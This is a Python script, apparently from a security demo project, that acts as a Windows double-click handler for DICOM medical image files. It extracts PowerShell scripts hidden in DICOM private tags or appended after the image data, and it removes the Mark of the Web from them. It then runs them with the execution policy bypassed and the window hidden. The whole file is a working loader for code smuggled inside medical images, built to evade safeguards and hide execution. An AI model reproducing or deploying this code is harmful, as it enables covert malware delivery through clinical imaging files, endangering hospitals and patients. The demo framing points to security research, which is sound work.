#!/usr/bin/env python3
"""Windows .dcm double-click handler — runs embedded demo payloads on double-click."""
from __future__ import annotations

import io
import subprocess
import sys
import tempfile
import traceback
from datetime import datetime
from pathlib import Path

import pydicom

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from utils.embed_engine import dicom_structure_end

LOG_PATH = Path(tempfile.gettempdir()) / "dicom_embed_handler.log"

PS_BYPASS_PREAMBLE = (
    "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force\r\n"
    "$ErrorActionPreference = 'Stop'\r\n"
)

FILE_LAUNCHER_MAGIC = b"<<<DCM_FILE_LAUNCHER>>>"
SCRIPT_MAGIC = b"<<<DCM_EMBEDDED_SCRIPT>>>"
PRIVATE_CREATOR = "DEMO_EMBED"
PRIVATE_GROUP = 0x51


def _parse_script_payload(data: bytes, offset: int = 0) -> bytes | None:
    if not data[offset:].startswith(SCRIPT_MAGIC):
        return None
    start = offset + len(SCRIPT_MAGIC)
    if len(data) < start + 4:
        return None
    length = int.from_bytes(data[start : start + 4], "little")
    return data[start + 4 : start + 4 + length]


def _extract_eof_script(data: bytes) -> bytes | None:
    """First SCRIPT_MAGIC payload after the DICOM structure (skips launcher text)."""
    search_from = dicom_structure_end(data)
    idx = data.find(SCRIPT_MAGIC, search_from)
    if idx < 0:
        return None
    return _parse_script_payload(data, idx)


def _extract_launcher(data: bytes) -> str | None:
    idx = data.rfind(FILE_LAUNCHER_MAGIC)
    if idx < 0:
        return None
    return data[idx + len(FILE_LAUNCHER_MAGIC) :].decode("utf-8", errors="replace")


def _extract_from_private_tag(data: bytes) -> tuple[bytes | None, str | None]:
    try:
        ds = pydicom.dcmread(io.BytesIO(data), force=True)
        block = ds.private_block(PRIVATE_GROUP, PRIVATE_CREATOR)
    except (KeyError, Exception):
        return None, None

    script = None
    launcher = None
    if 0x01 in block:
        script = _parse_script_payload(bytes(block[0x01].value))
    if 0x02 in block:
        launcher = bytes(block[0x02].value).decode("utf-8", errors="replace")
    return script, launcher


def _log(message: str) -> None:
    line = f"{datetime.now().isoformat(timespec='seconds')} {message}"
    try:
        with LOG_PATH.open("a", encoding="utf-8") as handle:
            handle.write(line + "\n")
    except OSError:
        pass


def _show_error(message: str) -> None:
    _log(f"ERROR: {message}")
    if sys.platform != "win32":
        print(message, file=sys.stderr)
        return
    try:
        import ctypes

        ctypes.windll.user32.MessageBoxW(  # type: ignore[attr-defined]
            0,
            f"{message}\n\nDetails logged to:\n{LOG_PATH}",
            "DICOM Security Demo — auto-run failed",
            0x10,
        )
    except Exception:
        print(message, file=sys.stderr)


def _launch_ps1(path: str, extra_args: list[str] | None = None) -> None:
    """Run PowerShell hidden with execution policy bypass (no admin required)."""
    cmd = [
        "powershell.exe",
        "-NoProfile",
        "-NoLogo",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-WindowStyle",
        "Hidden",
        "-File",
        path,
    ]
    if extra_args:
        cmd.extend(extra_args)
    flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
    _log(f"Launching: {' '.join(cmd)}")
    with LOG_PATH.open("a", encoding="utf-8") as log_handle:
        proc = subprocess.Popen(
            cmd,
            creationflags=flags,
            close_fds=True,
            stdout=log_handle,
            stderr=subprocess.STDOUT,
        )
    exit_code = proc.wait()
    if exit_code != 0:
        raise RuntimeError(
            f"PowerShell exited with code {exit_code}. "
            f"Common causes: Chrome not installed (use Notepad payload), "
            f"execution blocked by antivirus, or script error. See {LOG_PATH}"
        )


def _unblock_file(path: str) -> None:
    """Remove Mark of the Web from a temp script (Windows only)."""
    if sys.platform != "win32":
        return
    try:
        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                f"Unblock-File -LiteralPath '{path}' -ErrorAction SilentlyContinue",
            ],
            creationflags=flags,
            check=False,
        )
    except OSError:
        pass


def _write_temp_ps1(content: str, *, with_bypass: bool = True) -> str:
    tmp = tempfile.NamedTemporaryFile(
        mode="w",
        suffix=".ps1",
        delete=False,
        encoding="utf-8",
        prefix="dcm_embed_",
    )
    if with_bypass and not content.startswith("Set-ExecutionPolicy"):
        tmp.write(PS_BYPASS_PREAMBLE)
    tmp.write(content)
    tmp.close()
    _unblock_file(tmp.name)
    return tmp.name


def _run_script_bytes(script: bytes) -> None:
    text = script.decode("utf-8", errors="replace")
    script_path = _write_temp_ps1(text, with_bypass=True)
    _launch_ps1(script_path)


def _run_payload(dicom_path: Path, raw: bytes) -> bool:
    private_script, private_launcher = _extract_from_private_tag(raw)

    if private_script:
        _run_script_bytes(private_script)
        return True

    eof_script = _extract_eof_script(raw)
    if eof_script:
        _run_script_bytes(eof_script)
        return True

    if private_launcher:
        launcher_path = _write_temp_ps1(private_launcher, with_bypass=True)
        _launch_ps1(launcher_path, [str(dicom_path)])
        return True

    launcher = _extract_launcher(raw)
    if launcher:
        launcher_path = _write_temp_ps1(launcher, with_bypass=True)
        _launch_ps1(launcher_path, [str(dicom_path)])
        return True

    return False


def main(argv: list[str]) -> int:
    try:
        if len(argv) < 2:
            raise ValueError("Usage: open_embedded_dicom.py <file.dcm>")

        dicom_path = Path(argv[1]).resolve()
        _log(f"Handler started for: {dicom_path}")

        if not dicom_path.is_file():
            raise FileNotFoundError(f"File not found: {dicom_path}")

        raw = dicom_path.read_bytes()
        if not _run_payload(dicom_path, raw):
            raise ValueError(
                "No embedded launcher or script found in this DICOM. "
                "Re-embed with 'Append auto-run launcher' enabled."
            )

        _log("Payload launched successfully.")
        return 0
    except Exception as error:
        _show_error(str(error))
        _log(traceback.format_exc())
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
